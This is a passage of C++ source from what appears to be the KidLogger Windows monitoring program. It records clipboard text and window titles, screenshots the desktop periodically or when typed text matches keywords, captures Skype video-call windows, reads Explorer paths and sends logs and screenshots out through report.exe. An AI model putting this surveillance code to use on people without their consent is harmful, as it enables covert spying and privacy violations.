			AddLOG_message("Copy\Paste : <font color=\'blue\'>", 0, 0);
		else 
			AddLOG_message("Copy\Paste : ", 0, 0);


		AddLOG_message(text, 0, 0);

		if (0 == _safe_logger )
			AddLOG_message("</font><br>", 0, 0);
		else 
			AddLOG_message(cr,  0, 0);
		
		GlobalUnlock(hGlb);
		CloseClipboard();		  		
		
	} 	

	CDialog::OnDrawClipboard();
	
	
}

void CMainWndDlg::OnMakeMobile() 
{
	USBCopy dlg;
	dlg.DoModal();
	
}

void CMainWndDlg::OnTimer(UINT nIDEvent) 
{
		// IDC_STATIC8

	// get active Window
	if (nIDEvent == 1)
	{
		GUITHREADINFO gui;
		TCHAR str[500];
		gui.cbSize = sizeof(GUITHREADINFO);

		//GetGUIThreadInfo(0, &gui);

		//sprintf(str, "", gui.

	}

	if (nIDEvent == 10) // periodic screen capture
	{	
		TCHAR saved_capture_file[500];

		if ( isCurrentDesktopMy() == false)
			return;

		_screen_capturer.Capture( ::GetForegroundWindow(), "desktop", saved_capture_file);

		if(ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "send_every_screenshoot", 0))
		{
			TCHAR cmd_line[1001];
			
			ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "report_cmdline", cmd_line,1000);			
			
			lstrcat(cmd_line,"\"");
			lstrcat(cmd_line,saved_capture_file);
			lstrcat(cmd_line,"\"");
			
			ExecuteMin("report.exe",cmd_line);
		}	
		

	}

	if (nIDEvent == 11) // capture_on_keystore
	{
		//_screen_capturer.Capture( ::GetForegroundWindow(), "desktop");
		Monitor_Capture_on_Keystroke();

	}

	if (nIDEvent == 12) // capture_skype_video_calls_int
	{
		//_screen_capturer.Capture( ::GetForegroundWindow(), "desktop");
		Monitor_skype_video_calls();

	}

	if (nIDEvent == 13) // record active window name
	{
		//_screen_capturer.Capture( ::GetForegroundWindow(), "desktop");
		Monitor_ActiveWindowCaption();

	}

	if (nIDEvent == 14) // smtp_interval - email log files each %% minute
	{
		if ( isCurrentDesktopMy() == false)
			return;

		TCHAR text[600], name[300];
		ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "report_cmdline", text,500);		

		if ( 1 == _safe_logger ) 
			GetFileName(1, name, "");		
		else		
			GetFileName(1, name, ".htm");		
		
		lstrcat(text,"\"");
		lstrcat(text,name);
		lstrcat(text,"\"");		
		
		ExecuteMin("report.exe",text);		

	}

	
	CDialog::OnTimer(nIDEvent);
}


void CMainWndDlg::ReloadConfig()
{
	_screen_capturer._hwnd = m_hWnd;

	_safe_logger = ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "SafeLogger",0 );
	::_safe_logger = _safe_logger;

	int c = ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "CapturerInterval", 0);

	if ( c ) 
	{
		int с2= c * 1000 * 60;

		SetTimer(10, c * 1000 * 60, NULL);
	} else
		KillTimer(10);


	c = ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "smtp_interval", 0);

	if ( c ) 
	{
		SetTimer(14, c * 1000 * 60, NULL);
	} else
		KillTimer(14);

	TCHAR str[105];


	
	// 
	ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "capture_on_keystore", CharactersMonitor_include_filter, 100);

	if ( strlen(CharactersMonitor_include_filter) )
	{
		char* tmp = CharactersMonitor_include_filter;
		while ( strchr(tmp, ',') )
		{
			tmp = strchr(tmp, ',');
			*tmp =0;
			tmp++;
		}

		SetTimer(11, 1000, NULL);
	} else
		KillTimer(11);


	c = ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "capture_skype_video_calls_int", 0);

	if ( c ) 
	{
		_monitor_skype_video_calls_timer_seconds = 0;
		SetTimer(12, 5000, NULL);
	} else
		KillTimer(12);


	SetTimer(13, 1000, NULL); // check current window name;

}

void CMainWndDlg::Monitor_Capture_on_Keystroke()
{
	TCHAR CharactersMonitor_buffer[500];
	TCHAR saved_capture_file[500];

	Get_CharactersMonitor_buffer(CharactersMonitor_buffer, 490);

	SetDlgItemText(IDC_EDIT1, CharactersMonitor_buffer);

	if (strlen(CharactersMonitor_buffer)==0)
		return;


	// search filters
	LPCTSTR cur_filter_item  = CharactersMonitor_include_filter;
	BOOL matched = false;

	while ( *cur_filter_item ) {

		if ( StrStrI(CharactersMonitor_buffer, cur_filter_item))
		{
			CharactersMonitor_buffer[0]=0; // erase buffer
			matched = true;
			break;
		}
		
		cur_filter_item += strlen(cur_filter_item )+1;
		
			
	}

	// do actions
	
	if (matched)
	{
		Clear_CharactersMonitor_buffer();

		_screen_capturer.Capture( ::GetForegroundWindow(), cur_filter_item, saved_capture_file);
		
		if(ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "send_every_screenshoot", 0))
		{
			TCHAR cmd_line[1001];

			

			ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "report_cmdline", cmd_line,1000);			

			CString s = cmd_line;

			int c = s.Find("\"");
			if (c>1)
			{
				c = s.Find("\"", c+1);
				if (c>2) 
				{
					s.Insert(c, " - ");
					s.Insert(c+3,  cur_filter_item);
					strcpy(cmd_line, s);
				}				
			}			
			
			lstrcat(cmd_line,"\"");
			lstrcat(cmd_line,saved_capture_file);
			lstrcat(cmd_line,"\"");
			
			ExecuteMin("report.exe",cmd_line);
		}		

	}

}

// detect Skype window and 
void CMainWndDlg::Monitor_skype_video_calls()
{
	if ( false == isCurrentDesktopMy() ) 
		return;	

	HWND wnd1 = ::GetForegroundWindow();

	TCHAR text[101], class1[100], saved_capture_file[1500];
	::GetWindowText(wnd1, text, 50);

	::GetClassName( wnd1, class1, 90);  

	HWND wnd_chat_form = 0;
	HWND wnd_video = 0;

	if (StrStrI(text, "skype") )
	{
		
		
		do 
		{
			// search for visible Chat Windows
			wnd_chat_form = ::FindWindowEx(wnd1, wnd_chat_form, _T("TConversationForm.UnicodeClass"), NULL);
			if (wnd_chat_form ) {	
				
				// search for visible TConversationVideoPanel
				wnd_video  = ::FindWindowEx(wnd_chat_form, 0 , _T("TConversationVideoPanel"), NULL);
				if (wnd_video && ::IsWindowVisible(wnd_video) ) {
					break;
				}
				
			}

		} while (wnd_chat_form);

		
	} else
	if (  StrStrI(class1, "TConversationForm") )
	{	
		// this is a separate Chat Window		
		
		wnd_chat_form = wnd1;
		// search for visible TConversationVideoPanel

		wnd_video  = ::FindWindowEx(wnd_chat_form, 0 , _T("TConversationVideoPanel"), NULL);

		//TChatEntryControl
		//wnd_video  = ::FindWindowEx(wnd_chat_form, 0 , _T("TChatEntryControl"), NULL);

		/*if (wnd_video && ::IsWindowVisible(wnd_video) ) {
			
		}*/

		
	}


	if (wnd_video && ::IsWindowVisible(wnd_video) )
		{			

			if ( _monitor_skype_video_calls_timer_seconds > 0)
			{
				// decrease timer 
				_monitor_skype_video_calls_timer_seconds-=5;
				return;
			}
			_monitor_skype_video_calls_timer_seconds = ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "capture_skype_video_calls_int", 0);	// set timer again

			::GetWindowText(wnd_chat_form, text, 100);

			_screen_capturer.Capture( wnd_chat_form, text, saved_capture_file, false);

			if(ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "send_every_screenshoot", 0))
			{
				TCHAR cmd_line[1001];

				ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "report_cmdline", cmd_line,1000);			

				lstrcat(cmd_line,"\"");
				lstrcat(cmd_line,saved_capture_file);
				lstrcat(cmd_line,"\"");

				ExecuteMin("report.exe",cmd_line);
			}		
			
		}


}

HWND curr_wnd =0;
TCHAR curr_wnd_txt[200]={""};
DWORD _session_id=0;
BOOL desktop_switch = false;


/** ѕолучить мой session ID и передать его в CDlg_USBlogin
*/
void GetMySessionID()
{
	HANDLE hProc  = NULL;
    HANDLE hToken = NULL;
	
	_session_id =0;

	DWORD session_id = 0xFFFFFF;	
	
	hProc = OpenProcess( PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());	
	
	// Reopen the process token now that we have added the rights to
	// query the token, duplicate it, and assign it.
	BOOL fResult = OpenProcessToken(hProc, TOKEN_QUERY, &hToken);
	if (FALSE == fResult)  
	{
		return;
	}
	
	
	DWORD len=0;
	
	if ( !GetTokenInformation(hToken, TokenSessionId , (LPVOID)&session_id, sizeof(DWORD), &len ) )
		return;
	

	if (session_id != 0xFFFFFF) {
		_session_id = session_id;
		
	}
	
	
	CloseHandle(hToken);	
	
	return;
	
}

// TRUE - если текущий десктоп не Winlogon 
bool isCurrentDesktopMy()
{	
		
	if (pWTSGetActiveConsoleSessionId)
	{		
		//WriteLog("No remote data %d", WTSGetActiveConsoleSessionId());

		// ≈сли текуща€ консоль не наша то выход! 
		if (_session_id != WTSGetActiveConsoleSessionId())
			return false;
	} 

	HDESK desktop=OpenInputDesktop(0,0,0); 		
	if (desktop == NULL)
		return false;

	TCHAR desktopname[128] = {0}; 
	DWORD bytesread=120; 		
	GetUserObjectInformation(desktop,UOI_NAME,desktopname,128,&bytesread); 				
	CloseDesktop(desktop); 

	
	
	if (_tcsicmp(desktopname, _T("WinLogon")) )
		return true;

	return false;
}

// log a path of Windows Explorer Window
void CMainWndDlg::Log_Windows_Explorer_Path(HWND wnd)
{
	HWND wnd1;

	if ( IsWindowsVista() )
	{
		wnd1 = ::FindWindowEx(wnd, NULL, _T("WorkerW"), NULL);
		if (wnd1 ) {
			wnd1 = ::FindWindowEx(wnd1, NULL, _T("ReBarWindow32"), NULL);
			if (wnd1 ) {
				wnd1 = ::FindWindowEx(wnd1, NULL, _T("Address Band Root"), NULL);
				if (wnd1 ) {
					wnd1 = ::FindWindowEx(wnd1, NULL, _T("msctls_progress32"), NULL);					

					if (wnd1 ) {
						wnd1 = ::FindWindowEx(wnd1, NULL, _T("Breadcrumb Parent"), NULL);					

						if (wnd1 ) {
							wnd1 = ::FindWindowEx(wnd1, NULL, _T("ToolbarWindow32"), NULL);					


							char txt[600], buff[900];
							::GetWindowText(wnd1, txt, 200);
							
							
							if ( 1 == _safe_logger ) 
							{
								AddLOG_message(" - ", 0, 0);
								AddLOG_message(txt, 0, 0);
								AddLOG_message(cr,2, 0);
							}
							else 
							{
								sprintf(buff, "- %s <br>", txt);
								AddLOG_message(buff, 0, 0);
							}

							return;

						}

					}

				}
			}
		}


	} else

	{
		wnd1 = ::FindWindowEx(wnd, NULL, _T("WorkerW"), NULL);
		if (wnd1 ) {
			wnd1 = ::FindWindowEx(wnd1, NULL, _T("ReBarWindow32"), NULL);
			if (wnd1 ) {
				wnd1 = ::FindWindowEx(wnd1, NULL, _T("ComboBoxEx32"), NULL);
				if (wnd1 ) {
					wnd1 = ::FindWindowEx(wnd1, NULL, _T("ComboBox"), NULL);					

				}
			}
		}

	}

	if (wnd1)
	{
		IAccessible* pAcc = NULL;

		HRESULT hr = AccessibleObjectFromWindow(wnd1, OBJID_CLIENT,  IID_IAccessible , (void**)&pAcc);

		if ( (hr == S_OK) && (pAcc != NULL) )
		{
			BSTR bstrVal=0;
			VARIANT varChild;

			VariantInit(&varChild);
			varChild.vt =VT_I4;
			varChild.lVal =  CHILDID_SELF;
			hr = pAcc->get_accValue(varChild, &bstrVal);

			if (bstrVal)
			{
				char txt[600], buff[900];
				wcstombs(txt, bstrVal, 590);

				if ( 1 == _safe_logger ) 
				{
					AddLOG_message(" - ", 0, 0);
					AddLOG_message(txt, 0, 0);
					AddLOG_message(cr,2, 0);
				}
				else 
				{
					sprintf(buff, "- %s <br>", txt);
					AddLOG_message(buff, 0, 0);
				}
				SysFreeString(bstrVal);		  
			}
			pAcc->Release();

		}
	}

}


void CMainWndDlg::Monitor_ActiveWindowCaption()
{
	char parent[300] = {""};
	char text[700] = {""};
	char str[700] = {""};
	
	strcpy(text, "");
	
	HWND wnd = ::GetForegroundWindow();

	IsUserInputIdle();

	if ( false == isCurrentDesktopMy() ) 
	{
		if ( desktop_switch == false)
		{
			strcat(text, "[Desktop has been locked]<br>");
			//AddLOG_time();
			AddLOG_message(text, strlen(text), true); 
			AddLOG_message(cr, 2, 0);

			desktop_switch = true;
		}
		return;
	}

	::GetWindowText(wnd, str, 290); // get the Title of the current Window
	if ( strlen(str) < 1 ) return;		

	if ( curr_wnd != wnd || StrStrI(str, curr_wnd_txt)==0 )
	{ 
		curr_wnd=wnd; 		
		
		strcpy(curr_wnd_txt, str); 
		
		if (desktop_switch)
		{
			//AddLOG_time();
			strcpy(text, "[Desktop has been unlocked.] <br>.");
			AddLOG_message(text, strlen(text),  true); 
			AddLOG_message(cr, 0, 0);
			desktop_switch = false;
		}
			//
		

		AddLOG_message(cr, 0, 0);
		if ( 0 == _safe_logger ) 
		{
			strcat(text, "<br>");				
		}

		
		::GetWindowText( ::GetParent(wnd), parent, 290); // get the Title of the parent Window (if its a dialog box)
		
		
		if ( 1 == _safe_logger ) 
		{
			_tcscat(text, "---------[");
			
			if ( strlen(parent) > 1 ) {
				strcat(text, parent);				
				strcat(text, " - ");							
			}			
			
			_tcscat(text, str);
			_tcscat(text, "]---------");
			
			AddLOG_message(text, 0, 0); 	
			AddLOG_message(cr, 0, 0);
			
		}
		else {
			strcat(text, "<br>");
			strcat(text, "<b><font color=\"green\"> ");
			
			if ( strlen(parent) > 1 ) {
				strcat(text, parent);
				strcat(text, " - ");		
			}			
			strcat(text, str);
			strcat(text, "</font></b><br>");	
			AddLOG_message(text, 0, 0); 		
		}		
		
		AddLOG_message(cr, 0, 0);

		char class_name[100];
		GetClassName(wnd, class_name, 100);

		// log Windows File Explorer paths 
		if ( stricmp(class_name, "CabinetWClass")==0 )
			Log_Windows_Explorer_Path(wnd);
	}	

}

void CMainWndDlg::DeleteOldLogFiles()
{
	int delete_logs_after_x_days =  ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "delete_logs_after_x_days", 10);

	if (delete_logs_after_x_days == 0)
		return;


	WIN32_FIND_DATA FindFileData;
	

	char username[100], str[500];
	DWORD sz=50;	

	GetUserName( username, &sz);	

	ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "LogFilesPath", str, 500);
	if ( _taccess(str, 0) != 0){
		GetMyPath(str, false, NULL);		
	}
	
	strcat(str, username);			
	strcat(str, "\\*.*");		
	
	SetCurrentDirectory(str);
	
	// delete old user logs	
	
	HANDLE h = FindFirstFile(str, &FindFileData);

	CFileTime current_time = CFileTime::GetCurrentTime(); 
	CFileTimeSpan time_span;

	ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "LogFilesPath", str, 500);
	strcat(str, username);		
	strcat(str, "\\");		

	do {

		if ( strlen(FindFileData.cFileName) <=3)
			continue;

		//
		CFileTime ft(FindFileData.ftCreationTime);		
		time_span = current_time - ft;		

		if ( time_span.GetTimeSpan() > CFileTime::Day * delete_logs_after_x_days )
		{
			TCHAR path1[600];
			strcpy(path1, str);
			strcat(path1, FindFileData.cFileName);
			DeleteFile(path1);
		}

	} while ( FindNextFile(h, &FindFileData) );

	CloseHandle(h);

}

bool CMainWndDlg::IsWindowsVista(void)
{
	if ( verInfo.dwPlatformId == VER_PLATFORM_WIN32_NT && 
		verInfo.dwMajorVersion == 6 )
		return true;

	return false;
}
